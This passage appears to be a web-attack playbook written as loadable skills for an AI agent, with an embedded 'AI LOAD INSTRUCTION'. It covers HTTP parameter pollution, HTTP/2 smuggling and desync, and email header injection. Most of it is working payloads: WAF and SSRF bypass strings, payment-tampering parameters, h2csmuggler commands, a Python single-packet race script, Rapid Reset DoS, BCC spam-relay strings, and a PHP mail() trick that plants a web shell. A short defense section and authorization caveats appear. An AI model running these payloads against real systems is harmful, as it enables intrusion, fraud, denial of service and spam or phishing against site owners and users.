| JSP / Tomcat (servlet param) | First occurrence | `a=1` |
| Python / Django (`QueryDict`) | Last occurrence | `a=2` |
| Python / Flask (`request.args`) | First occurrence | `a=1` |
| Node.js / Express (`req.query`) | Array of values | `a=['1','2']` (shape may vary by parser version) |
| Perl / CGI | First occurrence | `a=1` |
| Ruby / Rack (Rack::Utils) | Last occurrence | `a=2` |
| Go `net/http` (`ParseQuery`) | First occurrence | `a=1` |

**Why it matters**: a WAF on **IIS** might see `1,2` while PHP backend receives `2` only — or the reverse if a proxy normalizes.

---

## 2. PAYLOAD PATTERNS

### 2.1 Basic duplicate key

```http
GET /api?q=safe&q=evil HTTP/1.1
```

### 2.2 Array-style (PHP / some frameworks)

```http
GET /api?id[]=1&id[]=2 HTTP/1.1
```

### 2.3 Mixed array + scalar

```http
GET /api?item[]=a&item=b HTTP/1.1
```

### 2.4 Encoded ampersand (parser differential)

```text
# Literal & inside a value vs new pair — depends on decoder
param=value1%26other=value2
param=value1&other=value2
```

### 2.5 Nested / bracket keys

```http
GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1
```

### 2.6 JSON duplicate keys

```json
{"test":"user","test":"admin"}
```

Many parsers keep **last** key; some keep **first**. JavaScript `JSON.parse` keeps the last duplicate key.

---

## 3. ATTACK SCENARIOS

### 3.1 HPP + WAF bypass

**Pattern**: WAF inspects **first** value; application uses **last**.

```text
id=1&id=1%20UNION%20SELECT%20...
```

Also try: benign value in JSON field duplicated in query string, if gateway merges sources differently.

### 3.2 HPP + SSRF

**Pattern**: validator reads **safe** URL; fetcher reads **internal/evil** URL.

```text
url=https://allowed.cdn.example/&url=http://169.254.169.254/
```

Confirm which component (library vs app) consumes which occurrence.

### 3.3 HPP + CSRF

**Pattern**: duplicate anti-CSRF token so one copy satisfies parser A and another satisfies parser B.

```text
csrf=LEGIT&csrf=IGNORED_OR_ALT
```

Use only in **authorized** CSRF assessments with a clear state-changing target.

### 3.4 HPP + business logic (e.g. payment)

```text
amount=1&amount=5000
quantity=1&quantity=-1
price=9.99&price=0.01
```

Pair with **race conditions** or **server-side rounding** for higher impact; HPP alone often needs a split interpretation across layers.

---

## 4. TOOLS

| Tool | How to use |
|---|---|
| **Burp Suite** | Repeater: duplicate keys in raw query/body; Param Miner / extensions for hidden params; compare responses for `first` vs `last` interpretation |
| **OWASP ZAP** | Manual Request Editor; Automated Scan may not deeply fuzz HPP — prefer manual variants |
| **Custom scripts** | Build exact raw HTTP (preserve ordering) — some clients normalize duplicates |

**Tip**: log **raw** query strings at the app if you control a test lab; some frameworks expose only the “winning” value while logs show the full string.

---

## 5. DECISION TREE

```text
                    +-------------------------+
                    | Duplicate param name    |
                    | same request            |
                    +------------+------------+
                                 |
              +------------------+------------------+
              |                                     |
       +------v------+                       +------v------+
       | Single app  |                       | WAF / CDN / |
       | layer only  |                       | proxy chain |
       +------+------+                       +------+------+
              |                                     |
    +---------v---------+                 +---------v---------+
    | Read framework    |                 | Map each hop:     |
    | docs + test       |                 | first/last/join/  |
    | a=1&a=2 vs swap   |                 | array             |
    +---------+---------+                 +---------+---------+
              |                                     |
              +------------------+------------------+
                                 |
                          +------v------+
                          | Pick attack |
                          | template    |
                          +------+------+
                                 |
         +-----------+-----------+-----------+-----------+
         |           |           |           |           |
    +----v----+ +----v----+ +----v----+ +----v----+ +----v----+
    | WAF vs  | | SSRF    | | CSRF    | | Logic   | | JSON    |
    | app     | | split   | | token   | | numeric | | dup key |
    | value   | | URL     | | confuse | | fields  | | parsers |
    +---------+ +---------+ +---------+ +---------+ +---------+
```

---

**Safety & scope**: HPP testing can change server state (payments, account settings). Run only where **explicitly authorized**, with scoped accounts, and document parser behavior before high-impact requests.


---
# Part 5: HTTP/2 Specific Attacks


# SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP/2 protocol-level attack techniques beyond basic request smuggling. Covers h2c smuggling, pseudo-header manipulation, HPACK attacks, single-packet race conditions, and H2→H1 downgrade injection. Base models conflate HTTP/2 smuggling with HTTP/1.1 smuggling — this skill focuses on H2-unique attack surface.

## 0. RELATED ROUTING

- [request-smuggling](../request-smuggling/SKILL.md) — CL.TE/TE.CL/TE.TE fundamentals and H2.CL/H2.TE variants
- [request-smuggling/H2_SMUGGLING_VARIANTS.md](../request-smuggling/H2_SMUGGLING_VARIANTS.md) — byte-level H2.CL/H2.TE payloads, CL.0, client-side desync
- [race-condition](../race-condition/SKILL.md) — single-packet attack leverages H2 multiplexing for race conditions
- [web-cache-deception](../web-cache-deception/SKILL.md) — cache poisoning via H2 smuggled responses


## 1. HTTP/2 ATTACK SURFACE OVERVIEW

| Feature | Attack Surface |
|---|---|
| Binary framing | Frame-level manipulation, parser differentials |
| HPACK compression | Compression oracles (CRIME/BREACH), table poisoning |
| Multiplexing | Single-packet race conditions, RST_STREAM flood |
| Server push | Cache poisoning via unsolicited push |
| Pseudo-headers (`:method`/`:path`/`:authority`/`:scheme`) | Injection, request splitting, path discrepancy |

---

## 2. h2c (HTTP/2 CLEARTEXT) SMUGGLING

### 2.1 Concept

h2c is HTTP/2 without TLS, negotiated via the HTTP/1.1 `Upgrade` mechanism. Many reverse proxies forward the `Upgrade: h2c` header without understanding it, allowing attackers to bypass proxy-level access controls.

```
Client ──[Upgrade: h2c]──> Reverse Proxy ──[forwards blindly]──> Backend
                                                                    │
                                                            Backend speaks H2
                                                            Proxy is blind to
                                                            the H2 conversation
```

### 2.2 Attack Flow

```
1. Client sends HTTP/1.1 request with:
   GET / HTTP/1.1
   Host: target.com
   Upgrade: h2c
   HTTP2-Settings: <base64 H2 settings>
   Connection: Upgrade, HTTP2-Settings

2. Proxy forwards request (doesn't understand h2c)
3. Backend responds: HTTP/1.1 101 Switching Protocols
4. Connection is now HTTP/2 between client and backend
5. Proxy is now a TCP tunnel — cannot inspect/filter H2 frames
6. Client sends H2 requests directly to backend, bypassing proxy rules
```

### 2.3 What You Can Bypass

```
✓ Path-based access controls (/admin blocked at proxy → accessible via h2c)
✓ WAF rules (proxy-side WAF can't inspect H2 binary frames)
✓ Rate limiting (proxy-level rate limits bypassed)
✓ Authentication (proxy-enforced auth headers)
✓ IP restrictions (proxy validates source IP, but h2c tunnel bypasses)
```

### 2.4 Tool: h2csmuggler

```bash
# Install
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2

# Basic smuggle — access /admin bypassing proxy restrictions
python3 h2csmuggler.py -x https://target.com/ --test

# Smuggle specific path
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin/users

# With custom headers
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin \
    -H "Authorization: Bearer token123"
```

### 2.5 Detection

```bash
# Check if backend supports h2c upgrade
curl -v --http1.1 https://target.com/ \
    -H "Upgrade: h2c" \
    -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA" \
    -H "Connection: Upgrade, HTTP2-Settings"

# 101 Switching Protocols → h2c supported
# 200/400/other → h2c not supported or proxy blocks upgrade
```

---

## 3. PSEUDO-HEADER INJECTION

### 3.1 HTTP/2 Pseudo-Headers

HTTP/2 replaces the request line with pseudo-headers (prefixed with `:`):

| Pseudo-Header | HTTP/1.1 Equivalent | Example |
|---|---|---|
| `:method` | Request method | `GET`, `POST` |
| `:path` | Request URI | `/api/users` |
| `:authority` | Host header | `target.com` |
| `:scheme` | Protocol | `https` |

### 3.2 Path Discrepancy Between Proxy and Backend

```
Scenario: Proxy routes based on :path, backend uses different parsing

H2 request:
  :method: GET
  :path: /public/../admin/users
  :authority: target.com

Proxy sees: /public/../admin/users → matches /public/* rule → ALLOWED
Backend normalizes: /admin/users → serves admin content
```

### 3.3 Duplicate Pseudo-Header Injection

HTTP/2 spec forbids duplicate pseudo-headers, but implementation varies:

```
:method: GET
:path: /public
:path: /admin       ← duplicate, forbidden by spec
:authority: target.com

Proxy may use first :path (/public) for routing
Backend may use last :path (/admin) for serving
```

### 3.4 Authority vs Host Disagreement

```
:authority: public.target.com    ← proxy routes based on this
host: admin.internal.target.com  ← backend may prefer Host header

Result: proxy routes to public vhost, backend serves admin vhost
```

### 3.5 Scheme Manipulation

```
:scheme: https
:path: /api/internal
:authority: target.com

If backend trusts :scheme to determine if request is "internal":
  :scheme: https → "external" → restricted
  :scheme: http  → "internal" → unrestricted access
```

---

## 4. HPACK COMPRESSION ATTACKS

### 4.1 CRIME/BREACH on HTTP/2

```
Principle: HPACK compresses headers. If attacker controls part of a header and a secret
exists in the same compression context, matching guesses → smaller frames → oracle.

Limitation: HPACK uses static+dynamic table (not raw DEFLATE), per-connection table,
requires many requests on same connection. Harder than original CRIME.
```

### 4.2 Header Table Poisoning

```
HPACK dynamic table stores recent headers across requests on same connection.
1. Attacker sends X-Custom: malicious-value → added to dynamic table
2. Subsequent requests may reference this entry
3. If CDN/proxy pools connections → attacker and victim share table → cross-request leakage
```

---

## 5. STREAM MULTIPLEXING ABUSE

### 5.1 Single-Packet Attack (Race Conditions)

HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, achieving true simultaneous server-side processing:

```
Traditional race condition: send N requests → network jitter → inconsistent timing
H2 single-packet: pack N requests into one TCP segment → all arrive simultaneously

                    ┌─ Stream 1: POST /transfer (amount=1000)
Single TCP packet ──├─ Stream 3: POST /transfer (amount=1000)
                    ├─ Stream 5: POST /transfer (amount=1000)
                    └─ Stream 7: POST /transfer (amount=1000)
                    
All 4 requests processed at the same nanosecond window
```

```python
# Using h2 library — prepare all requests, send in single write
import h2.connection, h2.config, socket, ssl

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)

conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
conn.initiate_connection()
sock.sendall(conn.data_to_send())

for i in range(20):
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [(':method','POST'),(':path',path),(':authority',host),(':scheme','https')])
    conn.send_data(sid, b'amount=1000', end_stream=True)

sock.sendall(conn.data_to_send())  # ALL frames in single TCP packet
```

### 5.2 RST_STREAM Flood (CVE-2023-44487 "Rapid Reset")

```
Attack: HEADERS (open stream) → RST_STREAM (cancel) → repeat thousands/sec
Server processes each open/close but client doesn't wait for responses
Amplification: minimal client resources → massive server CPU exhaustion
```

### 5.3 PRIORITY Manipulation

```
Set exclusive=true + weight=256 on attacker's stream → starve other users' requests
```

---

## 6. HTTP/2 → HTTP/1.1 DOWNGRADE ISSUES

### 6.1 Header Injection via Binary Format

H2 header values are binary — `\r\n` is valid data within a value. When proxy downgrades to H1, `\r\n` in header value becomes actual line break → header injection.

```
H2: X-Custom: "value\r\nInjected: evil"  → binary, valid
H1: X-Custom: value                      → line break
    Injected: evil                        → new header!
```

### 6.2 Transfer-Encoding Smuggling

H2 spec forbids `transfer-encoding`, but some proxies pass it through during downgrade → backend processes chunked encoding → H2.TE smuggling. See `../request-smuggling/H2_SMUGGLING_VARIANTS.md`.

### 6.3 Content-Length Discrepancy

H2 uses frame length (no CL needed). If proxy generates CL during downgrade but attacker also sent a CL header → conflicting lengths → request smuggling.

### 6.4 Header Name Case

H2 requires lowercase. Sending `Transfer-Encoding` (uppercase) is invalid H2 but some proxies pass it → valid H1 header on backend.

---

## 7. SERVER PUSH CACHE POISONING

```
Attack: trigger server push for /static/app.js with attacker-controlled content
  → PUSH_PROMISE frame pushes malicious response
  → browser/CDN caches poisoned content under legitimate URL
  → all subsequent loads serve attacker's content

Mitigation: most modern browsers/CDNs restrict or disable server push
```

---

## 8. DECISION TREE

```
Target supports HTTP/2?
│
├── YES
│   ├── Does proxy support h2c upgrade?
│   │   ├── YES → h2c smuggling (Section 2)
│   │   │   └── Access restricted paths bypassing proxy rules
│   │   └── NO → Continue
│   │
│   ├── H2→H1 downgrade between proxy and backend?
│   │   ├── YES → Header injection via binary format (Section 6.1)
│   │   │   ├── TE header passthrough? → H2.TE smuggling (Section 6.2)
│   │   │   ├── CL discrepancy? → H2.CL smuggling (Section 6.3)
│   │   │   └── See ../request-smuggling/H2_SMUGGLING_VARIANTS.md
│   │   └── NO (end-to-end H2) → Continue
│   │
│   ├── Need race condition?
│   │   ├── YES → Single-packet attack via multiplexing (Section 5.1)
│   │   │   └── Pack N requests in one TCP segment
│   │   └── NO → Continue
│   │
│   ├── Pseudo-header manipulation viable?
│   │   ├── :path discrepancy → path confusion (Section 3.2)
│   │   ├── :authority vs Host → vhost confusion (Section 3.4)
│   │   └── :scheme manipulation → access control bypass (Section 3.5)
│   │
│   ├── Server push enabled?
│   │   ├── YES → Cache poisoning via push (Section 7)
│   │   └── NO → Continue
│   │
│   └── DoS objective?
│       ├── RST_STREAM rapid reset (Section 5.2)
│       └── PRIORITY starvation (Section 5.3)
│
└── NO (HTTP/1.1 only)
    └── See ../request-smuggling/SKILL.md for H1-specific techniques
```

---

## 9. TOOLS REFERENCE

| Tool | Purpose |
|---|---|
| **h2csmuggler** | h2c upgrade smuggling (github.com/BishopFox/h2csmuggler) |
| **http2smugl** | H2-specific desync testing (github.com/neex/http2smugl) |
| **h2 (Python)** | HTTP/2 protocol lib for frame crafting (github.com/python-hyper/h2) |
| **nghttp2** | H2 client/server tools (nghttp2.org) |
| **Burp HTTP Request Smuggler** | Automated variant scanning |
| **curl --http2** | Quick H2 probing (built-in) |

---

## 10. QUICK REFERENCE

```bash
# h2c probe
curl -v --http1.1 https://target.com/ -H "Upgrade: h2c" -H "Connection: Upgrade, HTTP2-Settings" -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA"

# H2 support check
curl -v --http2 https://target.com/ 2>&1 | grep "ALPN"
```

---

# Part 6: Email Header Injection (SMTP / IMAP CRLF)

Email header injection is the CRLF-injection sibling for mail-sending code paths. When user input (name, subject, reply-to, "send to friend" address) is concatenated into a raw email message or SMTP envelope without stripping CR/LF, an attacker can inject additional headers, additional recipients, or a completely new MIME body. It belongs here because it's the same `\r\n`-boundary-escaping bug as HTTP header splitting (Part 3), just on the SMTP protocol.

## 1. Non-Obvious Techniques

### 1.1 PHP `mail()` extra-params injection

The dangerous PHP idiom:
```php
mail($to, $subject, $body, $headers);
// or, worse:
mail($to, $subject, $body, $headers, $additional_params);
```

Any of `$to`, `$subject`, `$headers` accepts embedded newlines in older PHP. The classic:
```
attacker@example.com\nBcc: victim1@x.com, victim2@x.com
```
adds BCC recipients — anonymous spam relay through the vulnerable server.

`$additional_params` (5th arg, often `-f sender@example.com`) is even worse: `-OQueueDirectory=/tmp -X/var/www/html/log.php` writes a log file at an attacker-chosen path with attacker-chosen content → RCE via PHP file inclusion.

### 1.2 Subject injection → header splitting

If `$subject` is reflected unescaped:
```
Hello\r\n
Reply-To: attacker@x.com\r\n
\r\n
<html><body>phished content</body></html>
```
The original subject line ends at the first `\r\n`, then a new `Reply-To:` is injected, then a blank line terminates the headers, then an entirely new MIME body replaces the legitimate one. Recipients see the attacker's body, not the app's.

### 1.3 IMAP / SMTP-Auth bypass via literal `\r\n` in mailbox names

Some webmails build IMAP commands by string concat:
```
A1 LOGIN "$user" "$pass"
```
If `$user` contains `"` or `\r\n`, you can break out of the quoted string and inject IMAP protocol commands. CVE class: IMAP command injection.

### 1.4 Node.js `nodemailer` and `setHeader` CRLF

Older `nodemailer` versions accepted `\r\n` in addresses/subjects. Modern versions sanitize, but raw `net.Socket` SMTP code does not. Same in Express `res.setHeader('X-Custom', userInput)` — Node stripped CRLF in `http` module around Node 0.10, but third-party servers (Fastify via find-my-way, custom HTTP/2 implementations) sometimes still allow it.

### 1.5 Header injection via `From: "Name" <addr>` display-name

The display name is rarely sanitized:
```
"Attacker\r\nBcc: x@y.com\r\n" <attacker@example.com>
```
Parsers that don't strip CR/LF from inside quoted strings let the injection through.

### 1.6 SMTP smuggling

SMTP smuggling (CVE-2023-51713 etc.) is the request-smuggling of email: differences in how endpoints interpret the body boundary (e.g., Postfix accepts `\n.\n` as end-of-data, outbound Gmail/outlook do not) let an attacker send mail that *appears* to come from a spoofed sender. Out of scope for app-level testing but worth noting in mail-server engagements.

## 2. Quick payload reference

### 2.1 Add BCC
```
attacker@example.com\r\nBcc: victim1@x.com,victim2@x.com
```

### 2.2 Replace body
```
Hello\r\n\r\n<html><body><h1>Account suspended. Click here:</h1>...
```

### 2.3 Force mail priority / routing
```
attacker@example.com\r\nX-Priority: 1\r\nImportance: High\r\nX-MS-Exchange-Organization-AuthAs: Internal
```
The last header in particular can land the message in the recipient's internal-trust zone on Exchange.

### 2.4 PHP mail() 5th param RCE
```
email = "attacker@example.com"
extra = "-OQueueDirectory=/tmp -X/var/www/html/shell.php"
mail(email, subject, "<?php system($_GET[0]); ?>", headers, extra)
```
Postfix `-X` writes a log file with the message body — including the PHP payload — at an attacker-chosen path.

### 2.5 Long-line fold/header continuation
```
Subject: a\r\n \r\n <new headers>
```
Space-prefixed continuation lines fold into the previous header. Useful when the parser strips bare `\r\n` but not `\r\n ` (CRLF + space).

## 3. Where to look

1. **Contact forms / "send to friend" / "tell-a-friend"** — `$to` field often takes user email.
2. **Password reset / email change flows** — `$to` and sometimes `$reply_to`.
3. **Newsletter subscriptions** — admin-CC'd confirmations.
4. **Referral programs** — typical spam relay target.
5. **SMTP/IMAP webmails** — Roundcube, Horde, SquirrelMail historically have frequent injection points.
6. **Password managers / email-based sharing** — the URL or note field may end up in mail body.

## 4. Defense

- **Strip CR and LF from every header value, period.** Not "escape", not "encode" — strip. Any `\r` or `\n` in a name/subject/address is malicious.
  - PHP: `str_replace(["\r", "\n", "%0a", "%0d"], '', $val)`
  - Better: `filter_var($email, FILTER_VALIDATE_EMAIL)` rejects embedded whitespace.
  - Node: use `nodemailer` ≥ 6.6+ which does this internally; never build SMTP by hand.
- **Never pass user input to `mail()` 5th param.** Use a fixed `-f` value.
- **For raw SMTP/IMAP servers**: implement proper literal/quoting per RFC 5321 §4.3; never concat user data into command strings.
- **Rate-limit and monitor outbound mail** — catches spam-relay incidents early.

## 5. Common AI blind spots

1. **PHP 8 still allows `\r\n` in `mail()` headers by default.** The fix is application-side, not language-side.
2. **The 5th param (`-r`/`-f`) is the RCE-class bug, not just a BCC sink.** `-X`/`-OQueueDirectory` writes files at attacker-chosen paths. Always check if app code passes user input there.
3. **Subject injection can replace the entire mail body.** A subject with `\r\n\r\n` terminates headers, then everything after is the new body. It's not just "extra headers."
4. **`filter_var(FILTER_VALIDATE_EMAIL)` rejects `\r\n` natively.** Use it instead of regex. Many home-rolled regex validations let `\n` through.
5. **SMTP smuggling is mail-server level, not app level.** Don't conflate the two. App-level injection is a bug you fix in code; SMTP smuggling is a config patch on Postfix/Exchange.
6. **The display-name part of `"Name" <addr>` is rarely sanitized.** Most apps validate the `<addr>` and trust the `Name`. That's where injection survives.
